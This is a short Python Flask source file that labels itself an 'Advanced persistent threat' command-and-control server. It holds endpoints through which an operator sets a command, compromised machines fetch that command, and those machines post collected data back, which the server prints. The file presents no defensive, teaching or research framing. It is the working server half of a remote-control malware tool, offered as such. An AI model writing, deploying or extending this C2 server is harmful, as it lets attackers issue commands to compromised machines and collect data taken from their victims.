           server.py
# server.py
from flask import Flask, request

app = Flask(__name__)
current_command = ""

@app.route("/get_command", methods=["GET"])
def get_command():
    return current_command

@app.route("/set_command", methods=["POST"])
def set_command():
    global current_command
    current_command = request.form.get("cmd", "")
    return "Command Set"

@app.route("/send_data", methods=["POST"])
def get_data():
    data = request.form.get("data", "")
    print("[DATA] =>", data)
    return "Received"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

#__________Advanced persistent threat________
#__________Mrelite-APT_________C2-server______
